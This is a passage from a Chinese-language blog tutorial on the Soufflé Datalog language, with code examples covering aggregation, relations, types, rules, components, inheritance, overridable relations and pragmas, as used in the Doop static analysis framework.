class="symbol">Transitive</span>(x:symbol, y:symbol)</span><br><span class="line"><span class="symbol">Transitive</span>(x,z) :- <span class="symbol">Less</span>(x,y), <span class="symbol">Less</span>(y,z).    // 传递关系：x &lt; y &amp;&amp; y &lt; z =&gt; (x, z)</span><br><span class="line"></span><br><span class="line">.decl <span class="symbol">Succ</span>(x:symbol, y:symbol)</span><br><span class="line"><span class="symbol">Succ</span>(x,y) :- <span class="symbol">Less</span>(x,y), !<span class="symbol">Transitive</span>(x,y).   // 后继关系：x &lt; y &amp;&amp; 不存在传递关系</span><br><span class="line"></span><br><span class="line">.output <span class="symbol">Less</span>, <span class="symbol">Transitive</span>, <span class="symbol">Succ</span></span><br></pre></td></tr></table></figure><p>计算后继关系的第一个和最后一个元素。</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.decl <span class="symbol">First</span>(x: symbol) output</span><br><span class="line"><span class="symbol">First</span>(x) :- <span class="symbol">A</span>(x), !<span class="symbol">Succ</span>(<span class="symbol">_</span>, x).  // 没有前驱</span><br><span class="line"></span><br><span class="line">.decl <span class="symbol">Last</span>(x: symbol) output</span><br><span class="line"><span class="symbol">Last</span>(x) :- <span class="symbol">A</span>(x), !<span class="symbol">Succ</span>(x, <span class="symbol">_</span>).   // 没有后继</span><br></pre></td></tr></table></figure><h2 id="例5：聚合"><a href="#例5：聚合" class="headerlink" title="例5：聚合"></a>例5：聚合</h2><p>Soufflé 中的聚合是指使用特定的函子来汇总有关查询的信息，聚合类型包括计数、求最小值/最大值、求和。在 Soufflé 中，信息通常不能从子目标（聚合函子的参数）流到外部作用域。例如，如果希望找到关系 Cost(x) 的最小值，无法找到使成本最小化的特定 x 值，因为这样的 x 值可能不是唯一的。</p><h3 id="计数"><a href="#计数" class="headerlink" title="计数"></a>计数</h3><p>计数函子用于计算子目标的集合大小，语法为 <code>count:&#123;&lt;sub-goal&gt;&#125;</code>。</p><p>以下示例输出“蓝色”汽车的数量，即 Car 中第二个参数为“蓝色”的元素数量：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.decl <span class="symbol">Car</span>(name: symbol, colour:symbol)</span><br><span class="line"><span class="symbol">Car</span>(<span class="string">&quot;Audi&quot;</span>, <span class="string">&quot;blue&quot;</span>).</span><br><span class="line"><span class="symbol">Car</span>(<span class="string">&quot;VW&quot;</span>, <span class="string">&quot;red&quot;</span>).</span><br><span class="line"><span class="symbol">Car</span>(<span class="string">&quot;BMW&quot;</span>, <span class="string">&quot;blue&quot;</span>).</span><br><span class="line"></span><br><span class="line">.decl <span class="symbol">BlueCarCount</span>(x: number)</span><br><span class="line"><span class="symbol">BlueCarCount</span>(c) :- c = count:&#123;<span class="symbol">Car</span>(<span class="symbol">_</span>, <span class="string">&quot;blue&quot;</span>)&#125;.</span><br><span class="line"></span><br><span class="line">.output <span class="symbol">BlueCarCount</span></span><br></pre></td></tr></table></figure><h3 id="最大值-最小值-求和"><a href="#最大值-最小值-求和" class="headerlink" title="最大值/最小值/求和"></a>最大值/最小值/求和</h3><p>max 函子输出集合的最大值，语法为 <code>max &lt;var&gt;:&#123;&lt;sub-goal(&lt;var&gt;)&gt;&#125;</code>。</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.decl <span class="symbol">A</span>(n:number)</span><br><span class="line"><span class="symbol">A</span>(<span class="number">1</span>). <span class="symbol">A</span>(<span class="number">10</span>). <span class="symbol">A</span>(<span class="number">100</span>).</span><br><span class="line"></span><br><span class="line">.decl <span class="symbol">MaxA</span>(x: number)</span><br><span class="line"><span class="symbol">MaxA</span>(y) :- y = max x:&#123;<span class="symbol">A</span>(x)&#125;.</span><br><span class="line"></span><br><span class="line">.output <span class="symbol">MaxA</span></span><br></pre></td></tr></table></figure><p>最小值语法为 <code>min &lt;var&gt;:&#123;&lt;sub-goal&gt;(&lt;var&gt;)&gt;&#125;</code>；求和语法为 <code>sum &lt;var&gt;:&#123;&lt;sub-goal&gt;(&lt;var&gt;)&gt;&#125;</code>。</p><h1 id="Souffle-程序"><a href="#Souffle-程序" class="headerlink" title="Soufflé 程序"></a>Soufflé 程序</h1><p>主要整理 Doop 中用到的一些内容，包括基本的关系、类型、规则，以及进阶的自定义函子、组件、编译指令。（这不是全包含了吗😅）</p><ul><li>语言（Language）</li><li>关系（Relations）</li><li>类型（Types）</li><li>规则（Rules）</li><li>组件（Components）</li><li>用户定义函子（User-Defined Functors）</li><li>编译指令（Pragma）</li></ul><h2 id="组成"><a href="#组成" class="headerlink" title="组成"></a>组成</h2><h3 id="语言"><a href="#语言" class="headerlink" title="语言"></a>语言</h3><p>Soufflé 中的主要语言元素是关系声明（relation declarations）、事实（facts）、规则（rules）和指令（directives）。</p><p>例如，以下程序中包含两个关系 A 和 B，关系必须声明（以便编译时检查属性的使用）；关系 A 有两个事实：<code>A(1,2).</code> 和 <code>A(2,3).</code>，事实是无条件成立的规则，即事实是 Horn Clause <code>A(1,2) ⇐ true</code>；关系 B 有两个规则：<code>B(x,y) :- A(x,y).</code> 和 <code>B(x,z) :- A(x,y), B(y,z).</code>，表示 Horn Clause <code>B(x,y) ⇐ A(x,y)</code> 和 <code>B(x,y) ⇐ A(x,y), B(y,z)</code>。</p><ul><li>Horn Clause 的解释可以看：<a href="http://www.blogjava.net/Javawind/archive/2007/12/12/167108.html">http://www.blogjava.net/Javawind/archive/2007/12/12/167108.html</a></li></ul><p>最后的指令 <code>.output B</code> 表示在执行结束时查询关系 B，并将其写入文件或打印到屏幕中。关系声明、事实、规则和指令的顺序可以是任意的，并不影响最终的执行。</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.decl <span class="symbol">A</span>(x:number, y:number)  // declaration of relation <span class="symbol">A</span></span><br><span class="line"><span class="symbol">A</span>(<span class="number">1</span>,<span class="number">2</span>).                      // facts of relation <span class="symbol">A</span></span><br><span class="line"><span class="symbol">A</span>(<span class="number">2</span>,<span class="number">3</span>).</span><br><span class="line"></span><br><span class="line">.decl <span class="symbol">B</span>(x:number, y:number)  // declaration of relation <span class="symbol">B</span></span><br><span class="line"><span class="symbol">B</span>(x,y) :- <span class="symbol">A</span>(x,y).            // rules of relation <span class="symbol">B</span></span><br><span class="line"><span class="symbol">B</span>(x,z) :- <span class="symbol">A</span>(x,y), <span class="symbol">B</span>(y,z).</span><br><span class="line"></span><br><span class="line">.output <span class="symbol">B</span>                    // <span class="symbol">Output</span> relation <span class="symbol">B</span> </span><br></pre></td></tr></table></figure><h3 id="关系"><a href="#关系" class="headerlink" title="关系"></a>关系</h3><p>Soufflé 要求声明关系，关系是一组有有序元组 <code>(x1, ..., xk)</code>，其中每个元素 <code>xi</code> 都是由类型定义的数据域的成员。以下声明定义了仅包含数字对的关系 A，第一个属性被命名为 x，第二个属性被命名为 y，两个属性的类型都是数字。</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.decl <span class="symbol">A</span>(x:number, y:number).</span><br></pre></td></tr></table></figure><p>Soufflé 的类型检查器将推断规则中的变量类型，并检查它们是否正确使用。</p><h3 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h3><p>Soufflé 利用类型化的 Datalog 方言进行静态检查，从而能够提早发现查询规范中的错误。必须为关系的任何属性指定类型，Soufflé 中有四种原始类型：符号（<code>symbol</code>）、数字（<code>number</code>）、无符号数字（<code>unsigned</code>）、浮点数（<code>float</code>）。</p><h3 id="规则"><a href="#规则" class="headerlink" title="规则"></a>规则</h3><p>规则是条件逻辑语句，以头部开始，然后是身体。例如，如果一对 (x, y) 在 B 中则 A 成立：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">A</span>(x,y) :- <span class="symbol">B</span>(x,y).</span><br></pre></td></tr></table></figure><h3 id="组件"><a href="#组件" class="headerlink" title="组件"></a>组件</h3><p>Soufflé 有组件这个概念，可用于模块化大型逻辑程序。一个组件可能包含其他组件、关系、类型声明、事实、规则和指令；组件必须声明和实例化后才可以使用，每个组件都有自己的命名空间；组件可以继承一个或多个超级组件。</p><h3 id="用户定义函子"><a href="#用户定义函子" class="headerlink" title="用户定义函子"></a>用户定义函子</h3><p>可以使用用户定义函子扩展 Soufflé，用户定义函子用 C/C++ 实现。用户定义函子有两种风格：朴素函子和有状态的函子，有状态的函子公开记录和符号表。</p><h3 id="编译指令"><a href="#编译指令" class="headerlink" title="编译指令"></a>编译指令</h3><p>用编译指令配置 Soufflé，例如，可以在源码中设置命令行选项。</p><h2 id="组件-Components"><a href="#组件-Components" class="headerlink" title="组件 Components"></a>组件 Components</h2><p>组件是程序的模块化部分，可以封装元素，包括关系声明、类型声明、规则、事实、指令和其他组件。组件包含声明和实例化两个操作。</p><p>使用 <code>.comp</code> 关键字声明组件，组件包含的元素定义在 <code>&#123;...&#125;</code> 内：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.comp <span class="symbol">MyComponent</span> &#123;</span><br><span class="line">    .type myType = number        // type</span><br><span class="line">    .decl <span class="symbol">TheAnswer</span>(x:myType)    // component relation</span><br><span class="line">    <span class="symbol">TheAnswer</span>(<span class="number">42</span>).               // component fact</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用 <code>.init</code> 关键字初始化组件，在内部，Soufflé 将组件实例扁平化（flatten），并为每个组件实例创建命名空间，因此要用限定名称调用其中的元素。</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.init myInstance1 = <span class="symbol">MyComponent</span>         // 实例化</span><br><span class="line"></span><br><span class="line">.decl <span class="symbol">Test</span>(x:number)</span><br><span class="line"><span class="symbol">Test</span>(x) :- myInstance1.<span class="symbol">TheAnswer</span>(x).    // . 限定</span><br><span class="line">.output <span class="symbol">Test</span></span><br></pre></td></tr></table></figure><p>对于上面的例子，Soufflé 在内部对组件实例进行了如下扩展：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.type myInstance1.myType = number</span><br><span class="line">.decl myInstance1.<span class="symbol">TheAnswer</span>(x:myType)    // relation of myInstance1</span><br><span class="line">myInstance1.<span class="symbol">TheAnswer</span>(<span class="number">42</span>).               // fact of myInstance1</span><br><span class="line"></span><br><span class="line">.decl <span class="symbol">Test</span>(x:number)</span><br><span class="line"><span class="symbol">Test</span>(x) :- myInstance1.<span class="symbol">TheAnswer</span>(x).</span><br><span class="line">.output <span class="symbol">Test</span></span><br></pre></td></tr></table></figure><p>可以使用 <code>souffle --show=transformed-datalog xxx.dl &gt; expansion.dl</code> 生成扩展后的 datalog 文件。</p><p>下面定义了两个 MyComponent 实例：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.init myInstance1 = <span class="symbol">MyComponent</span></span><br><span class="line">.init myInstance2 = <span class="symbol">MyComponent</span></span><br><span class="line">myInstance2.<span class="symbol">TheAnswer</span>(<span class="number">33</span>).</span><br><span class="line"></span><br><span class="line">.decl <span class="symbol">Test</span>(x:number)</span><br><span class="line"><span class="symbol">Test</span>(x) :- myInstance1.<span class="symbol">TheAnswer</span>(x). </span><br><span class="line"><span class="symbol">Test</span>(x) :- myInstance2.<span class="symbol">TheAnswer</span>(x). </span><br><span class="line">.output <span class="symbol">Test</span></span><br></pre></td></tr></table></figure><p>Soufflé 在内部生成以下逻辑程序，通过前缀避免名称冲突：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.type myInstance1.myType = number</span><br><span class="line">.decl myInstance1.<span class="symbol">TheAnswer</span>(x:myType)    // relation of myInstance1</span><br><span class="line">myInstance1.<span class="symbol">TheAnswer</span>(<span class="number">42</span>).               // fact of myInstance1</span><br><span class="line">.type myInstance2.myType = number</span><br><span class="line">.decl myInstance2.<span class="symbol">TheAnswer</span>(x:myType)    // relation of myInstance1</span><br><span class="line">myInstance2.<span class="symbol">TheAnswer</span>(<span class="number">42</span>).               // fact of myInstance1</span><br><span class="line">myInstance2.<span class="symbol">TheAnswer</span>(<span class="number">33</span>).</span><br><span class="line"></span><br><span class="line">.decl <span class="symbol">Test</span>(x:number)</span><br><span class="line"><span class="symbol">Test</span>(x) :- myInstance1.<span class="symbol">TheAnswer</span>(x).</span><br><span class="line"><span class="symbol">Test</span>(x) :- myInstance2.<span class="symbol">TheAnswer</span>(x).</span><br><span class="line">.output <span class="symbol">Test</span></span><br></pre></td></tr></table></figure><p>如果规则/事实在没有关系声明的组件中定义，Soufflé 不会预先添加前缀，而是会将解析推迟到实际的组件实例化。</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.decl <span class="symbol">Out</span>(x:number) </span><br><span class="line">.comp <span class="symbol">A</span> &#123; </span><br><span class="line">   .decl <span class="symbol">R</span>(x:number) </span><br><span class="line">   .comp <span class="symbol">Count</span> &#123;              // 在组件内部定义组件</span><br><span class="line">       <span class="symbol">R</span>(<span class="number">1</span>).                  // fact accessing <span class="symbol">R</span> outside of <span class="symbol">Count</span></span><br><span class="line">       <span class="symbol">R</span>(x+<span class="number">1</span>):- <span class="symbol">R</span>(x), x&lt;<span class="number">10.</span>   // rule accessing <span class="symbol">R</span> outside of <span class="symbol">Count</span></span><br><span class="line">   &#125; </span><br><span class="line">   .init myCount = <span class="symbol">Count</span>      // instantiate <span class="symbol">Count</span></span><br><span class="line">   <span class="symbol">Out</span>(x) :- <span class="symbol">R</span>(x).            // rule accessing <span class="symbol">Out</span> outside of <span class="symbol">A</span> </span><br><span class="line">&#125;</span><br><span class="line">.init myA = <span class="symbol">A</span></span><br><span class="line">.output <span class="symbol">Out</span></span><br></pre></td></tr></table></figure><p>Soufflé 会将代码扩展，实际会是这样：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.decl <span class="symbol">Out</span>(x:number) </span><br><span class="line">.decl myA.<span class="symbol">R</span>(x:number) </span><br><span class="line">myA.<span class="symbol">R</span>(<span class="number">1</span>).</span><br><span class="line">myA.<span class="symbol">R</span>((x+<span class="number">1</span>)) :- myA.<span class="symbol">R</span>(x), x &lt; <span class="number">10.</span></span><br><span class="line"><span class="symbol">Out</span>(x) :- </span><br><span class="line">   myA.<span class="symbol">R</span>(x).</span><br><span class="line">.output <span class="symbol">Out</span></span><br></pre></td></tr></table></figure><p>如果规则和事实在本地作用域中被实例化，那么前缀将被预先添加到前面。</p><h3 id="类型参数化"><a href="#类型参数化" class="headerlink" title="类型参数化"></a>类型参数化</h3><p>组件可以通过未限定的类型名称进行参数化，下面的例子实例化了两个不同的类型的组件：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.comp <span class="symbol">ParamComponent</span>&lt;myType&gt; &#123;</span><br><span class="line">    .decl <span class="symbol">TheAnswer</span>(x:myType)    // component relation</span><br><span class="line">    <span class="symbol">TheAnswer</span>(<span class="number">42</span>).               // component fact</span><br><span class="line">    .output <span class="symbol">TheAnswer</span>            // component output directive</span><br><span class="line">&#125;</span><br><span class="line">.init numberInstance = <span class="symbol">ParamComponent</span>&lt;number&gt;</span><br><span class="line">.init floatInstance = <span class="symbol">ParamComponent</span>&lt;float&gt;</span><br></pre></td></tr></table></figure><p>在内部，Soufflé 将显式实例化不同属性的组件：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.decl numberInstance.<span class="symbol">TheAnswer</span>(x:number)     // relation of numberInstance</span><br><span class="line">numberInstance.<span class="symbol">TheAnswer</span>(<span class="number">42</span>).                // fact of numberInstance</span><br><span class="line">.output numberInstance.<span class="symbol">TheAnswer</span>             // output directive of numberInstance</span><br><span class="line"></span><br><span class="line">.decl floatInstance.<span class="symbol">TheAnswer</span>(x:float)       // relation of floatInstance</span><br><span class="line">floatInstance.<span class="symbol">TheAnswer</span>(<span class="number">42</span>).                 // fact of floatInstance</span><br><span class="line">.output floatInstance.<span class="symbol">TheAnswer</span>              // output directive of floatInstance</span><br></pre></td></tr></table></figure><p>组件名称也可以用参数传递，例如，实例化时指定生成组件 One：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.decl <span class="symbol">R</span>(x:number)</span><br><span class="line">.comp <span class="symbol">Case</span>&lt;<span class="symbol">Selector</span>&gt; &#123;</span><br><span class="line">   .comp <span class="symbol">One</span> &#123; </span><br><span class="line">     <span class="symbol">R</span>(<span class="number">1</span>). </span><br><span class="line">   &#125; </span><br><span class="line">   .comp <span class="symbol">Two</span> &#123; </span><br><span class="line">     <span class="symbol">R</span>(<span class="number">2</span>).</span><br><span class="line">   &#125; </span><br><span class="line">   .init selection = <span class="symbol">Selector</span> // instantiation depending on type parameter <span class="string">&quot;Selector&quot;</span> </span><br><span class="line">&#125; </span><br><span class="line">.init myCase = <span class="symbol">Case</span>&lt;<span class="symbol">One</span>&gt; </span><br><span class="line">.output <span class="symbol">R</span></span><br></pre></td></tr></table></figure><p>在内部将生成以下程序：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.decl <span class="symbol">R</span>(x:number) </span><br><span class="line"><span class="symbol">R</span>(<span class="number">1</span>). </span><br><span class="line">.output <span class="symbol">R</span></span><br></pre></td></tr></table></figure><h3 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h3><p>一个组件可以继承多个超级组件，超级组件的元素将被传递给子组件。使用 <code>:</code> 继承超级组件，用 <code>,</code> 分隔：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">.comp <span class="symbol">Base1</span> &#123;</span><br><span class="line">    .type myNumber = number</span><br><span class="line">    .decl <span class="symbol">TheAnswer</span>(x:myNumber)</span><br><span class="line">    <span class="symbol">TheAnswer</span>(<span class="number">42</span>).</span><br><span class="line">&#125;</span><br><span class="line">.comp <span class="symbol">Base2</span> &#123; </span><br><span class="line">    <span class="symbol">TheAnswer</span>(<span class="number">41</span>). </span><br><span class="line">&#125;</span><br><span class="line">.comp <span class="symbol">Sub</span>  : <span class="symbol">Base1</span>, <span class="symbol">Base2</span> &#123; // inherit from <span class="symbol">Base1</span> and <span class="symbol">Base2</span></span><br><span class="line">    .decl <span class="symbol">WhatIsTheAnswer</span>(n:myNumber)</span><br><span class="line">    <span class="symbol">WhatIsTheAnswer</span>(n) :- <span class="symbol">TheAnswer</span>(n).</span><br><span class="line">    .output <span class="symbol">WhatIsTheAnswer</span></span><br><span class="line">&#125;</span><br><span class="line">.init mySub = <span class="symbol">Sub</span></span><br></pre></td></tr></table></figure><p>组件 Base1 和 Base2 将所有组件元素传递给子组件 Sub，在内部实例化 mySub 时生成以下代码：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.type mySub.myNumber = number</span><br><span class="line">.decl mySub.<span class="symbol">TheAnswer</span>(x:mySub.myNumber) </span><br><span class="line">.decl mySub.<span class="symbol">WhatIsTheAnswer</span>(n:mySub.myNumber) </span><br><span class="line">mySub.<span class="symbol">TheAnswer</span>(<span class="number">42</span>).</span><br><span class="line">mySub.<span class="symbol">TheAnswer</span>(<span class="number">41</span>).</span><br><span class="line">mySub.<span class="symbol">WhatIsTheAnswer</span>(n) :- mySub.<span class="symbol">TheAnswer</span>(n).</span><br><span class="line">.output mySub.<span class="symbol">WhatIsTheAnswer</span></span><br></pre></td></tr></table></figure><h3 id="可重写的关系"><a href="#可重写的关系" class="headerlink" title="可重写的关系"></a>可重写的关系</h3><p>如果在超级组件中将关系声明为可覆盖（<code>overridable</code>），则子组件可以重写关联的规则和事实。例如</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.comp <span class="symbol">Base</span> &#123;</span><br><span class="line">    .decl <span class="symbol">R</span>(x:number) overridable</span><br><span class="line">    <span class="symbol">R</span>(<span class="number">1</span>).</span><br><span class="line">    <span class="symbol">R</span>(x+<span class="number">1</span>) :- <span class="symbol">R</span>(x), x &lt; <span class="number">5.</span> </span><br><span class="line">    .output <span class="symbol">R</span></span><br><span class="line">&#125;</span><br><span class="line">.comp <span class="symbol">Sub</span> : <span class="symbol">Base</span> &#123;</span><br><span class="line">    .override <span class="symbol">R</span></span><br><span class="line">    <span class="symbol">R</span>(<span class="number">2</span>).</span><br><span class="line">    <span class="symbol">R</span>(x+<span class="number">1</span>) :- <span class="symbol">R</span>(x), x &lt; <span class="number">4.</span> </span><br><span class="line">&#125;</span><br><span class="line">.init mySub = <span class="symbol">Sub</span></span><br></pre></td></tr></table></figure><p>子组件丢弃事实 <code>R(1).</code> 和规则 <code>R(x+1) :- R(x), x &lt; 5.</code>，然后进行重写，在内部实例化 mySub 时生成以下代码：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.decl mySub.<span class="symbol">R</span>(x:number)overridable </span><br><span class="line">mySub.<span class="symbol">R</span>(<span class="number">2</span>).</span><br><span class="line">mySub.<span class="symbol">R</span>((x+<span class="number">1</span>)) :- </span><br><span class="line">   mySub.<span class="symbol">R</span>(x),</span><br><span class="line">   x &lt; <span class="number">4.</span></span><br><span class="line">.output mySub.<span class="symbol">R</span></span><br></pre></td></tr></table></figure><p>例如，可以用 PrecisePointsto 继承和覆盖 AbstractPointsto 的 HeapAllocationMerge 关系，实现更精确的分析：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">.comp <span class="symbol">AbstractPointsto</span>&#123;</span><br><span class="line">    .decl <span class="symbol">HeapAllocationMerge</span>(heap,mergeHeap) overridable</span><br><span class="line">    <span class="symbol">HeapAllocationMerge</span>(heap,<span class="string">&quot;&lt;&lt;string-constant&gt;&gt;&quot;</span>) :-</span><br><span class="line">        <span class="symbol">StringConstant</span>(heap).</span><br><span class="line">    // ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.comp <span class="symbol">PrecisePointsto</span> : <span class="symbol">AbstractPointsto</span>&#123;   // 继承</span><br><span class="line">    .override <span class="symbol">HeapAllocationMerge</span>           // 覆盖</span><br><span class="line">    <span class="symbol">HeapAllocationMerge</span>(heap,<span class="string">&quot;&lt;&lt;string-constant&gt;&gt;&quot;</span>) :-</span><br><span class="line">        <span class="symbol">StringConstant</span>(heap),</span><br><span class="line">        !<span class="symbol">ClassNameStringConstant</span>(heap),</span><br><span class="line">        !<span class="symbol">SimpleNameStringConstant</span>(heap).</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.init precise_pointsto = <span class="symbol">PrecisePointsto</span></span><br></pre></td></tr></table></figure><h3 id="类型参数化和继承"><a href="#类型参数化和继承" class="headerlink" title="类型参数化和继承"></a>类型参数化和继承</h3><p>超级组件的类型参数可以在子组件声明中明确指定，下面定义了一个带参数 K 的子组件 B，用于实例化带参数 K 的超组件 A：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.comp <span class="symbol">A</span>&lt;<span class="symbol">T</span>&gt; &#123; .... &#125;</span><br><span class="line">.comp <span class="symbol">B</span>&lt;<span class="symbol">K</span>&gt; : <span class="symbol">A</span>&lt;<span class="symbol">K</span>&gt; &#123; ... &#125;</span><br></pre></td></tr></table></figure><p>类型参数也可以用作基类，基于类型参数 T 选择性继承，<code>A&lt;T&gt;</code> 的实例定义继承的超级组件：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.comp <span class="symbol">A</span>&lt;<span class="symbol">T</span>&gt; : <span class="symbol">T</span> &#123; ... &#125;</span><br></pre></td></tr></table></figure><p>通过继承，可以实现复杂的组件实例化，注意这里要引入一个新的组件，因为参数 <code>Graph&lt;number&gt;</code> 不是简单的标识符：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// 错误</span><br><span class="line">.init reach = <span class="symbol">Reachability</span>&lt;<span class="symbol">Graph</span>&lt;number&gt;&gt;   // syntax error</span><br><span class="line"></span><br><span class="line">// 正确</span><br><span class="line">.comp <span class="symbol">NumberGraph</span> : <span class="symbol">Graph</span>&lt;number&gt; &#123; &#125; // <span class="symbol">NumberGraph</span> inherits  </span><br><span class="line">.init reach = <span class="symbol">Reachability</span>&lt;<span class="symbol">NumberGraph</span>&gt;</span><br></pre></td></tr></table></figure><h2 id="编译指令-Pragma"><a href="#编译指令-Pragma" class="headerlink" title="编译指令 Pragma"></a>编译指令 Pragma</h2><p>允许直接在源码中设置命令行标志和配置，例如下面的代码将在调用 souffle 时指定 <code>--legacy</code> 标志：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.pragma <span class="string">&quot;legacy&quot;</span> </span><br><span class="line">.decl <span class="symbol">A</span>(x:number) output</span><br><span class="line"><span class="symbol">A</span>(<span class="number">1</span>).</span><br></pre></td></tr></table></figure><p>有一些配置不能用命令行标志设置，因此也就不能用这种方法设置。</p><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>想更深入地了解 Datalog 可以看看 <a href="http://blogs.evergreen.edu/sosw/files/2014/04/Green-Vol5-DBS-017.pdf">Datalog and Recursive Query Processing</a>，还有学长推荐的 <a href="https://www.jianshu.com/p/d7598d17ff2b">Dimension Shift! 一起来学Datalog吧！</a>，这方面我倒是没有扩展地去看；Doop 框架的提出可以看 <a 